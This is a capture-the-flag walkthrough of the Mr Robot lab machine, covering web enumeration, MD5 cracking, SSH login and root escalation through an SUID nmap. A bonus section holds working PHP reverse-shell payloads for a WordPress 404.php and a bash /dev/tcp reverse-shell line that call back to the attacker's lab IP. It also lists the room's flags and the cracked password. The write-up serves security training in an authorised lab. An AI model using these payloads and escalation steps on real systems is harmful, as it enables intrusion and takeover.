🤖 TryHackMe - Mr Robot CTF
Room: Mr Robot CTF
Platform: TryHackMe / Local VM (VulnHub)
Difficulty: Beginner / Intermediate
Category: WordPress - SSH - Hash Cracking - Linux PrivEsc (SUID)
Credit: Leon Johnson

TryHackMe
Difficulty
OS
Status

📖 Overview
Mr Robot is a classic CTF inspired by the TV show. Goal is to find 3 hidden keys.

Key 1 - Web enumeration - robots.txt / key-1-of-3.txt
Key 2 - Crack MD5 hash -> SSH as robot
Key 3 - PrivEsc via nmap SUID -> Root
No Metasploit needed. All manual.

This room teaches the full chain: Web -> Hash Cracking -> SSH -> PrivEsc.

🛠️ Tools Used
Tool	Usage
nmap	Port scanning
gobuster / dirb	Directory brute force
curl	Read web files
john / CrackStation	Crack MD5 hash
ssh	Login as robot
nmap --interactive	SUID PrivEsc to root
nc -lvnp	Reverse Shell Listener
🔍 Walkthrough
0. Lab Setup - Local vs TryHackMe
Important lesson from this lab:

If on TryHackMe: Use tun0 IP - 10.8.x.x / 10.14.x.x - from ip a | grep tun0
If Local VM (VMware): Use eth0 IP - 192.168.240.128 - from hostname -I
Never use Windscribe / other VPN with local lab - it changes your IP to 10.141.x.x and target can't reach you.
In this lab (Local):

Kali: 192.168.240.128
Mr Robot: 192.168.240.138
Both on NAT / Host-only - same subnet, ping works.
nmap -sn 192.168.240.0/24
ping 192.168.240.138
1. Enumeration - Nmap
nmap -sC -sV 192.168.240.138
Open Ports:

22/tcp - SSH
80/tcp - HTTP - WordPress
443/tcp - HTTPS
2. Key 1 - Web Enumeration
curl http://192.168.240.138/robots.txt
curl http://192.168.240.138/key-1-of-3.txt
Key 1:

073403c8a58a1f80d943455fb30724b9
⚠️ This is NOT a hash to crack, it's the flag itself. Put it as-is in What is key 1?

3. Find Password Hash
curl http://192.168.240.138/password.raw-md5
cat password.raw-md5
Result:

robot:c3fcd3d76192e4007dfb496cca67e13b
4. Crack Hash - John / CrackStation
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
john --show hash.txt
Password for robot:

abcdefghijklmnopqrstuvwxyz
You can also use https://crackstation.net for this one.

5. SSH Access - robot
ssh robot@192.168.240.138
# password: abcdefghijklmnopqrstuvwxyz
whoami
# robot
ls -la
6. Key 2
cat /home/robot/key-2-of-3.txt
Key 2:

822c73956184f694993bede3eb39f959
7. Privilege Escalation - nmap SUID -> Root
Check SUID binaries:

find / -perm -u=s -type f 2>/dev/null
# nmap is SUID!
ls -la /usr/bin/nmap
Exploit:

nmap --interactive
!sh
whoami
# root
id
# uid=0(root)
GTFOBins: nmap with SUID can spawn a root shell via --interactive -> !sh

8. Key 3
cat /root/key-3-of-3.txt
Key 3:

04787ddef27c3dee1ee161b21670b4e4
🐚 Bonus: Reverse Shell via WordPress Theme Editor (Alternative Path)
If you want a reverse shell instead of SSH, you can use WordPress Admin -> Appearance -> Editor -> 404.php.

⚠️ Common mistakes:

Don't use php -r '...' in a web file - that's CLI syntax. Use <?php ... ?>
Don't use shell_exec one-liner - it connects then disconnects immediately:
// BAD - Disconnects
<?php $sock=fsockopen("192.168.240.128",4254);shell_exec("/bin/sh -i <&3 >&3 2>&3"); ?>
Stable payload - Use proc_open:

<?php $sock=fsockopen("192.168.240.128",4254);$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock), $pipes); ?>
Steps:

# 1. Listener first
nc -lvnp 4254

# 2. Update 404.php in WordPress, then trigger it
curl http://192.168.240.138/wp-content/themes/twentyfifteen/404.php
Output:

listening on [any] 4254 ...
connect to [192.168.240.128] from (UNKNOWN) [192.168.240.138]
Stabilize shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'
Note: In zsh, /dev/tcp doesn't work. Use bash first:

bash
bash -i >& /dev/tcp/192.168.240.128/4254 0>&1
🚩 Flags / Answers
Question	Answer
What is key 1?	073403c8a58a1f80d943455fb30724b9
What is key 2?	822c73956184f694993bede3eb39f959
What is key 3?	04787ddef27c3dee1ee161b21670b4e4
User robot password	abcdefghijklmnopqrstuvwxyz
⚠️ In your public GitHub repo, you can redact keys if you want to avoid spoilers.

🐛 Common Errors & Fixes
Error	Cause	Fix
zsh: no such file or directory: /dev/tcp/...	zsh doesn't support /dev/tcp	Run bash first, then the command
connect ... then disconnect immediately	shell_exec one-liner closes	Use proc_open payload above
No connection in nc	Wrong IP - Windscribe / tun0 vs eth0	Local = eth0, TryHackMe = tun0, Close Windscribe
Trying to crack Key 1	Key 1 is flag, not hash	Don't crack it, submit as-is
Permission denied on nmap --interactive	nmap not SUID on other machines	Check find / -perm -u=s first
🧠 Key Learnings
robots.txt is gold - Always check it, it leaks key-1 and password.raw-md5.
Hash != Flag - Key 1 looks like MD5 but it's the answer. The real hash to crack is c3fcd3d....
WordPress Theme Editor = RCE - If you get admin, you get code execution via 404.php.
SUID is dangerous - nmap SUID = instant root with --interactive -> !sh.
Local vs VPN IP - Local lab = eth0, TryHackMe = tun0, Never mix VPNs.
🔗 References
Room: https://tryhackme.com/room/mrrobot
Original VM: https://www.vulnhub.com/entry/mr-robot-1,151/
GTFOBins - nmap: https://gtfobins.github.io/gtfobins/nmap/
CrackStation: https://crackstation.net/
👨‍💻 Author
Ahmed Ashraf

TryHackMe Labs & CTF Writeups
Focus: Penetration Testing / WordPress / Linux PrivEsc
This writeup is for educational purposes only in an authorized lab environment. Do not use these techniques on systems you don't own or don't have permission to test.

